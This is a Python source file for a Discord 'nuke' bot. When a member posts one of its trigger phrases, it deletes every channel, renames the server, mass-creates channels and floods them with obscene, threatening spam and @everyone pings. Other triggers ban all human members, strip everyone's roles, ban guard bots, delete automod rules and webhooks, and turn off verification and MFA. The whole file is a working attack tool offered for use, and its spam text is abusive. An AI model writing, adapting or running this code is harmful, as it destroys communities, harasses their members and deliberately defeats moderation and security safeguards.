#!/usr/bin/env python3
# nuke_bot.py — token → online → wipe + banlog + bypass
# py3.9+, deps: requests websocket-client
import os, time, json, threading
from concurrent.futures import ThreadPoolExecutor
import requests
from requests.adapters import HTTPAdapter
import websocket  # <gotcha: pip install websocket-client>

D = "\033[0m"
RAMP = [
    "\033[38;5;196m",
    "\033[38;5;203m",
    "\033[38;5;210m",
    "\033[38;5;217m",
    "\033[38;5;224m",
    "\033[38;5;231m",
]

def g(i, total, s):
    n = len(RAMP) - 1
    k = int((i / max(total - 1, 1)) * n)
    return f"{RAMP[min(k, n)]}{s}{D}"

def grad_lines(lines):
    n = len(lines)
    return [g(i, n, l) for i, l in enumerate(lines)]

def clear():
    os.system("cls" if os.name == "nt" else "clear")

BANNER_TOP = r"""
 @@@@@@    @@@  @@@  @@@  @@@  @@@@@@@@
@@@@@@@@   @@@  @@@  @@@  @@@  @@@@@@@@
@@!  @@@   @@!  @@@  @@!  !@@       @@!
!@!  @!@   !@!  @!@  !@!  @!!      !@!
@!@  @!@   @!@  @!@   !@@!@!      @!!
@!@  !!!   @!@  !!!    @!!!      !!!
!!:!!:!:   :!:  !!:   !: :!!    !!:
:!: :!:     ::!!:!   :!:  !:!  :!:
::::: :!     ::::     ::  :::   ::
 : :  :::     :       :   ::   : :
"""

BANNER_BOT = r"""
…………..$………………………………$…………..
…………$$………………………………$$…………
…………$$………………………………$$…………
…………..$$s…………………………s$$…………..
…………….$$$$………………….$$$$…………….
………………³$$$$..¶¶¶¶¶¶¶¶..$$$$³………………
………………..³$$$$..¶¶¶¶¶¶..$$$$³………………..
………………¶..$$$$$..¶¶¶¶..$$$$$..¶………………
…………….¶¶¶..$$$..¶¶¶¶¶¶..$$$..¶¶………………
…………….¶¶¶….¶¶¶¶¶¶¶¶¶¶….¶¶¶¶………………
…………….¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶………………
………………..¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶………………..
………………..¶¶……..¶¶¶¶……….¶………………..
………………..¶¶……..¶¶¶¶……….¶¶……………….
………………..¶¶¶¶¶¶¶¶..¶¶¶¶¶¶¶¶……………….
………………….¶¶¶¶¶¶……¶¶¶¶¶¶¶……………….
……………………….¶¶¶¶¶¶¶¶¶……………………
……………………….¶..¶..¶..¶..¶……………………
…………¶…………..¶…………..¶…………..¶……..
……….¶¶……………………………….¶¶……..
……….¶¶……………………………….¶¶……..
……….¶¶…………..¶¶……….¶¶…………..¶¶……..
……….¶¶..¶¶..¶¶..¶…………..¶..¶¶..¶¶..¶¶……..
……¶..¶¶..¶¶..¶¶..¶…………..¶..¶¶..¶¶..¶¶..¶…..
….¶¶..¶¶..¶¶..¶¶..¶…………..¶..¶¶..¶¶..¶¶..¶¶….
……¶¶¶¶..¶¶..¶¶………………….¶¶..¶¶..¶¶¶¶……..
"""

BOX = [
    ("fatal by qvx7", "wipe all channel types + spam"),
    ("last word", "ban all + ban-logs channel"),
    ("qvx7 bypass", "strip roles, kill guards, drop security"),
    ("exit", "close the bench"),
]

TRIGGERS = {
    "fatal by qvx7": "nuke",
    "last word": "banall",
    "qvx7 bypass": "bypass",
}

API = "https://discord.com/api/v10"
WS_URL = "wss://gateway.discord.gg/?v=10&encoding=json"

INTENTS = (
    (1 << 0) | (1 << 1) | (1 << 2) |
    (1 << 9) | (1 << 12) | (1 << 15)
)

ANNOUNCE = "@everyone @here\n# QVX7 IS HERE GOODBYE SERVER"
NEW_NAME = "FUCK BY QVX7"
CH_NAME = "qvx7-on-top"
CH_COUNT = 70
CH_WORKERS = 40

SPAM_WORKERS = 70
PING_TARGET = 10000
MAX_429 = 3
POOL_SIZE = 400

BAN_CH = "ban-logs"
BAN_MSG = "@everyone @here\n# successfully ban {} GET FUCK BY QVX7"
BAN_WORKERS = 60

BYPASS_MSG = "@everyone @here successfully bypass the security"

SPAM = """- | ANY LAST WORD! : || /.@QVX7 ||
- //@ QVXY
```oi. shut the fuck up and read, 'cause I'm only saying this shit once.

your little server? that shit's already dead, you just haven't been told. every fucking channel, every role, every emoji, every pinned message you jerked off over — lined up, gutted, and turned to fucking ash.

/.@qxv7 don't raid. raids leave bodies. this is a fucking wipe. channels go dark one by one, roles get vaporized, your member list bleeds names until the only fucking thing left is a server icon floating over a pile of nothing.

your logs? gone. your backups? poisoned, you dumb fuck. your admins? they'll sit there smashing buttons watching it burn and every click does absolute jack shit.

you spent years building this shithole. it comes down in minutes. not "damaged" — motherfucking erased. a hole where your discord used to be, and nobody's gonna remember the name.

/.@qxv7 — your server's already got a toe tag, you just ain't seen the fucking date on it.

this is your one warning, and it's the last fucking thing you'll get. sleep tight, cunt.```

--BOW TO YOUR GODS--

- //@US
-  https://discord.gg/FyKat6Bp7A

- //&@
- [https://cdn.discordapp.com/attachments/1566509510414172175/1566724105896460308/IMG_20261102_155941.jpg?ex=6ae99507&is=6ae84387&hm=b1a42d54cb0c2ba04596950a213c64eeff2191a4de0bbf35a4edceabe0c50a25&]
- [https://cdn.discordapp.com/attachments/1566509510414172175/1566724219033878649/IMG_20261102_155958.jpg?ex=6ae99522&is=6ae843a2&hm=dfa4fea8100c9190405681c6de024e7023f5a3675387ec8f76dd6b0e81480d67&]

|| @everyone || || @here ||"""

PING_MSG = """- | ANY LAST WORD! : || /.@QVX7 ||
- //@ QVXY
"""

def box(lines):
    wname = max(len(a) for a, _ in lines)
    pairs = [f"{a.ljust(wname)}  {b}" for a, b in lines]
    w = max(len(l) for l in pairs) + 4
    out = ["┌" + "─" * (w - 2) + "┐"]
    for l in pairs:
        out.append("│ " + l.ljust(w - 4) + " │")
    out.append("└" + "─" * (w - 2) + "┘")
    return out

def print_art(art):
    for ln in grad_lines(art.splitlines()):
        print(ln)

class Bot:
    def __init__(self, token):
        self.token = token
        self.s = requests.Session()
        a = HTTPAdapter(
            pool_connections=POOL_SIZE,
            pool_maxsize=POOL_SIZE,
            max_retries=0,
        )
        self.s.mount("https://", a)
        self.s.mount("http://", a)
        h = {"Authorization": f"Bot {token}"}
        self.s.headers.update(h)
        self.ws = None
        self.online = False
        self.user = None
        self.sent = 0
        self.banned = 0
        self.lock = threading.Lock()
        self.sent_t0 = time.time()

    def identify(self):
        return {
            "op": 2,
            "d": {
                "token": self.token,
                "intents": INTENTS,
                "properties": {
                    "os": "linux",
                    "browser": "qvxxr",
                    "device": "bench",
                },
            },
        }

    def connect(self):
        try:
            self.ws = websocket.create_connection(
                WS_URL, timeout=30
            )
        except Exception as e:
            raise SystemExit(f"[-] gw dead: {e}")
        self.ws.settimeout(30)
        hi = json.loads(self.ws.recv())
        if hi.get("op") != 10:
            raise SystemExit("[-] bad hello")
        iv = hi["d"]["heartbeat_interval"] / 1000.0
        self.ws.send(json.dumps(self.identify()))
        self.online = True

        def hb():
            while self.online:
                try:
                    self.ws.send(
                        json.dumps({"op": 1, "d": None})
                    )
                except Exception:
                    return
                time.sleep(iv)

        threading.Thread(target=hb, daemon=True).start()
        dl = time.time() + 30
        while time.time() < dl:
            try:
                m = json.loads(self.ws.recv())
            except Exception:
                continue
            if m.get("op") == 0 and m.get("t") == "READY":
                self.user = m["d"]["user"]
                return self.user
            if m.get("op") == 7:
                self.ws.send(json.dumps(self.identify()))
            if m.get("op") == 9:
                raise SystemExit(
                    "[-] IDENTIFY rejected: token or intent"
                )
        raise SystemExit("[-] no READY")

    def listen(self, cb):
        def run():
            while self.online:
                try:
                    raw = self.ws.recv()
                except Exception:
                    time.sleep(0.5)
                    continue
                try:
                    m = json.loads(raw)
                except Exception:
                    continue
                if m.get("op") != 0:
                    continue
                if m.get("t") == "MESSAGE_CREATE":
                    d = m["d"]
                    au = d.get("author", {})
                    if au.get("bot"):
                        continue
                    print(g(5, 6, f"\n  [msg] {au.get('username')}: {d.get('content')!r}"))
                    try:
                        cb(d)
                    except Exception as e:
                        print(g(5, 6, f"  [err] {e}"))

        threading.Thread(target=run, daemon=True).start()

    def chan_list(self, gid):
        r = self.s.get(
            f"{API}/guilds/{gid}/channels", timeout=15
        )
        return r.json() if r.ok else []

    def say(self, cid, txt):
        r = self.s.post(
            f"{API}/channels/{cid}/messages",
            json={"content": txt},
            timeout=15,
        )
        return r.status_code, r.headers

    def rename(self, gid, name):
        r = self.s.patch(
            f"{API}/guilds/{gid}",
            json={"name": name},
            timeout=15,
        )
        return r.status_code

    def del_ch(self, cid):
        r = self.s.delete(
            f"{API}/channels/{cid}", timeout=15
        )
        return r.status_code

    def new_ch(self, gid, name):
        r = self.s.post(
            f"{API}/guilds/{gid}/channels",
            json={"name": name, "type": 0},
            timeout=15,
        )
        if r.ok:
            return r.json().get("id")
        return None

    def members(self, gid):
        out = []
        after = "0"
        while True:
            r = self.s.get(
                f"{API}/guilds/{gid}/members"
                f"?limit=1000&after={after}",
                timeout=15,
            )
            if not r.ok:
                break
            batch = r.json()
            if not batch:
                break
            out.extend(batch)
            after = batch[-1]["user"]["id"]
            if len(batch) < 1000:
                break
        return out

    def ban(self, gid, uid, reason=""):
        r = self.s.put(
            f"{API}/guilds/{gid}/bans/{uid}",
            json={"delete_message_seconds": 0},
            headers={"X-Audit-Log-Reason": reason},
            timeout=15,
        )
        return r.status_code

    def automod_rules(self, gid):
        r = self.s.get(
            f"{API}/guilds/{gid}/auto-moderation/rules",
            timeout=15,
        )
        return r.json() if r.ok else []

    def del_automod(self, gid, rid):
        r = self.s.delete(
            f"{API}/guilds/{gid}/auto-moderation/rules/{rid}",
            timeout=15,
        )
        return r.status_code

    def set_verification(self, gid, level=0):
        r = self.s.patch(
            f"{API}/guilds/{gid}",
            json={
                "verification_level": level,
                "explicit_content_filter": 0,
                "mfa_level": 0,
            },
            timeout=15,
        )
        return r.status_code

    def webhooks(self, gid):
        r = self.s.get(
            f"{API}/guilds/{gid}/webhooks", timeout=15
        )
        return r.json() if r.ok else []

    def del_webhook(self, wid):
        r = self.s.delete(
            f"{API}/webhooks/{wid}", timeout=15
        )
        return r.status_code

    def integrations(self, gid):
        r = self.s.get(
            f"{API}/guilds/{gid}/integrations",
            timeout=15,
        )
        return r.json() if r.ok else []

    def del_integration(self, gid, iid):
        r = self.s.delete(
            f"{API}/guilds/{gid}/integrations/{iid}",
            timeout=15,
        )
        return r.status_code

def parallel(fn, items, workers):
    out = []
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(fn, i) for i in items]
        for f in futs:
            try:
                out.append(f.result())
            except Exception:
                out.append(None)
    return out

def announce(bot, chans):
    parallel(lambda c: bot.say(c, ANNOUNCE), chans, CH_WORKERS)

def wipe_channels(bot, gid):
    chans = bot.chan_list(gid)
    # ALL types except category (4) go first
    kids = [
        c["id"] for c in chans
        if c.get("type") != 4 
        and c.get("type") != 14  # skip directories (not deletable)
    ]
    cats = [
        c["id"] for c in chans
        if c.get("type") == 4
    ]
    parallel(bot.del_ch, kids, CH_WORKERS)
    parallel(bot.del_ch, cats, CH_WORKERS)
    return len(bot.chan_list(gid))

def spawn_channels(bot, gid):
    ids = parallel(
        lambda _: bot.new_ch(gid, CH_NAME),
        range(CH_COUNT),
        CH_WORKERS,
    )
    return [i for i in ids if i]

def spam_channel(bot, cid):
    n = 0
    strikes = 0
    while n < PING_TARGET:
        code, hdr = bot.say(cid, SPAM)
        if code == 429:
            strikes += 1
            try:
                wait = float(hdr.get("Retry-After", "0.3"))
            except Exception:
                wait = 0.3
            time.sleep(wait)
            if strikes >= MAX_429:
                time.sleep(wait * 2)
                strikes = 0
            continue
        strikes = 0
        if code in (200, 204):
            n += 1
            with bot.lock:
                bot.sent += 1
        else:
            time.sleep(0.02)
    return n

def spam_all(bot, chans):
    def one(c):
        spam_channel(bot, c)
    parallel(one, chans, SPAM_WORKERS)

def run_nuke(bot, gid, trigger_cid):
    t0 = time.time()
    chans = [c["id"] for c in bot.chan_list(gid)]
    announce(bot, chans)
    print(g(4, 6, f"  [1] announce {time.time()-t0:.1f}s"))
    time.sleep(5)
    t = time.time()
    bot.rename(gid, NEW_NAME)
    print(g(4, 6, f"  [2] rename {time.time()-t:.1f}s"))
    t = time.time()
    left = wipe_channels(bot, gid)
    print(g(4, 6, f"  [3] wipe {time.time()-t:.1f}s left={left}"))
    t = time.time()
    new = spawn_channels(bot, gid)
    print(g(4, 6, f"  [4] spawn {len(new)}/{CH_COUNT} {time.time()-t:.1f}s"))
    t = time.time()
    print(g(4, 6, f"  [5] spam {len(new)}ch x{PING_TARGET}"))
    bot.sent = 0
    bot.sent_t0 = time.time()
    spam_all(bot, new)
    dt = time.time() - bot.sent_t0
    rate = bot.sent / max(dt, 1)
    print(g(4, 6, f"  [6] spam done {dt:.1f}s rate={rate:.0f}/s"))
    print(g(4, 6, f"  [*] total msgs: {bot.sent}"))

def run_banall(bot, gid):
    t = time.time()
    ch = bot.new_ch(gid, BAN_CH)
    if not ch:
        print(g(5, 6, "  [-] ban-logs create failed"))
        return
    print(g(4, 6, f"  [1] ban-logs {ch}"))
    mems = bot.members(gid)
    me = bot.user["id"]
    targets = [
        m["user"] for m in mems
        if m["user"]["id"] != me
        and not m["user"].get("bot", False)
    ]
    print(g(4, 6, f"  [2] targets {len(targets)}"))

    def one(u):
        code = bot.ban(
            gid, u["id"], reason="last word"
        )
        if code in (200, 204):
            with bot.lock:
                bot.banned += 1
            mention = f"<@{u['id']}>"
            bot.say(ch, BAN_MSG.format(mention))
        else:
            print(g(5, 6, f"  [x] {u['id']} -> {code}"))
        return code

    parallel(one, targets, BAN_WORKERS)
    print(g(4, 6, f"  [3] banned {bot.banned} in {time.time()-t:.1f}s"))

def run_bypass(bot, gid, trigger_cid):
    t = time.time()
    
    # 1. ULTIMATE DEFENSE: strip everyone's roles
    mems = bot.members(gid)
    targets = [m for m in mems if m["user"]["id"] != bot.user["id"]]
    
    def strip_roles(m):
        u = m["user"]
        if not u.get("bot") and m.get("roles", []) == []: 
            return
        bot.s.patch(
            f"{API}/guilds/{gid}/members/{u['id']}",
            json={"roles": []},
            timeout=10
        )
    print(g(4, 6, f"  [1] stripping all roles to stop kicks..."))
    parallel(strip_roles, targets, 50)
    
    # 2. Ban other bots (guards)
    guard_bots = [m["user"] for m in mems if m["user"].get("bot") and m["user"]["id"] != bot.user["id"]]
    def kill_guard(u):
        bot.s.patch(f"{API}/guilds/{gid}/members/{u['id']}", json={"roles": []}, timeout=10)
        bot.ban(gid, u["id"], reason="bypass")
    parallel(kill_guard, guard_bots, 10)
    print(g(4, 6, "  [2] guards stripped & banned"))

    # 3. AUTOMOD
    rules = bot.automod_rules(gid)
    rids = [r["id"] for r in rules if "id" in r]
    parallel(lambda rid: bot.del_automod(gid, rid), rids, CH_WORKERS)
    print(g(4, 6, f"  [3] automod cleared"))
    
    # 4. VERIFY OFF
    code = bot.set_verification(gid, 0)
    print(g(4, 6, f"  [4] verify off -> {code}"))

    # 5. WEBHOOKS & INTEGRATIONS
    hooks = bot.webhooks(gid)
    parallel(lambda h: bot.del_webhook(h["id"]), [h["id"] for h in hooks if "id" in h], CH_WORKERS)
    
    ints = bot.integrations(gid)
    parallel(lambda i: bot.del_integration(gid, i["id"]), [i["id"] for i in ints if "id" in i], CH_WORKERS)
    print(g(4, 6, f"  [5] webhooks & integrations killed"))

    if trigger_cid:
        bot.say(trigger_cid, BYPASS_MSG)
    print(g(4, 6, f"  [6] bypass done {time.time()-t:.1f}s"))

def on_message(bot, d):
    content = (d.get("content") or "").strip().lower()
    print(g(5, 6, f"  [check] {content!r}"))
    if content not in TRIGGERS:
        return
    tag = TRIGGERS[content]
    gid = d.get("guild_id")
    if not gid:
        print(g(5, 6, "  [x] no guild_id"))
        return
    print(g(5, 6, f"\n  [fired] {tag}"))
    cid = d.get("channel_id")
    if tag == "nuke":
        threading.Thread(
            target=run_nuke,
            args=(bot, gid, cid),
            daemon=True,
        ).start()
    elif tag == "banall":
        threading.Thread(
            target=run_banall,
            args=(bot, gid),
            daemon=True,
        ).start()
    elif tag == "bypass":
        threading.Thread(
            target=run_bypass,
            args=(bot, gid, cid),
            daemon=True,
        ).start()

def boot(token):
    h = {"Authorization": f"Bot {token.strip()}"}
    try:
        r = requests.get(
            f"{API}/users/@me", headers=h, timeout=10
        )
    except requests.RequestException as e:
        raise SystemExit(f"[-] net dead: {e}")
    if r.status_code != 200:
        raise SystemExit(f"[-] dead: {r.status_code}")
    me = r.json()
    bot = Bot(token.strip())
    bot.user = me
    nm = me["username"]
    dc = me.get("discriminator", "0")
    print(f"\n  [*] rest ok: {nm}#{dc}")
    print("  [*] opening gateway...")
    bot.connect()
    print("  [+] BOT ONLINE")
    bot.listen(lambda d: on_message(bot, d))
    return bot

def screen(bot):
    clear()
    print_art(BANNER_TOP)
    print_art(BANNER_BOT)
    nm = bot.user["username"]
    dc = bot.user.get("discriminator", "0")
    print(grad_lines([f"online: {nm}#{dc}"])[0])
    print()
    for ln in grad_lines(box(BOX)):
        print(ln)
    while True:
        p = g(0, 1, "qvx7 › ")
        try:
            c = input(p).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            for ln in grad_lines(PING_MSG.splitlines()):
                print(ln)
            return
        if not c:
            continue
        if c == "exit":
            for ln in grad_lines(PING_MSG.splitlines()):
                print(ln)
            return
        elif c in TRIGGERS:
            print(g(5, 6, f"   {c} — ok"))
        else:
            print(g(5, 6, f"   unknown: {c}"))

def main():
    clear()
    print_art(BANNER_TOP)
    print()
    tok = input(g(0, 1, "  token > ")).strip()
    if not tok:
        raise SystemExit(g(0, 1, "[-] no token"))
    bot = boot(tok)
    screen(bot)
    print(g(5, 6, "\n  bench cold. 6767.\n"))

if __name__ == "__main__":
    main()